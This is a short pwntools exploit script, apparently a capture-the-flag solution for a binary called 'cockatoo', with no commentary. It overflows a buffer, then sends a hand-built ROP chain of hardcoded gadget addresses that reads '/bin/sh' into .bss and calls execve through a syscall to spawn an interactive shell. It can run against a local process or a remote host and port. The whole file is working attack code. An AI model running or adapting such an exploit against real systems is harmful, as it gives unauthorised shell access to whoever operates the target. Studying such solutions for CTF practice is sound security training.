#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("cockatoo")

gs = """
# b *0x4011AC
b *0x40118E
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.send(b'A'*256)

RDI_eq_RAX_RET = 0x00000000004016a7
RAX_RET = 0x0000000000401001
RBX_RET = 0x0000000000401551
R12_R13_RET = 0x00000000004017e4
RSI_RDX_callRBX = 0x4014c6
SYSCALL_RET = 0x401A8B

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

pause()

p.send(b'\x17')
p.send(
    p64(R12_R13_RET)+p64(e.bss(0x400))+p64(0x1000) +
    p64(RBX_RET)+p64(RAX_RET) +  # bypass call rbx
    p64(RSI_RDX_callRBX) +
    p64(RAX_RET) + p64(0) + p64(RDI_eq_RAX_RET) +
    p64(SYSCALL_RET) +

    p64(R12_R13_RET)+p64(0)*2 +
    p64(RBX_RET)+p64(RAX_RET) +  # bypass call rbx
    p64(RSI_RDX_callRBX) +
    p64(RAX_RET)+p64(e.bss(0x400)) + p64(RDI_eq_RAX_RET) +
    p64(RAX_RET)+p64(0x3b) +
    p64(SYSCALL_RET)
)
p.send(b'\n')
p.send(b'/bin/sh')

p.interactive()
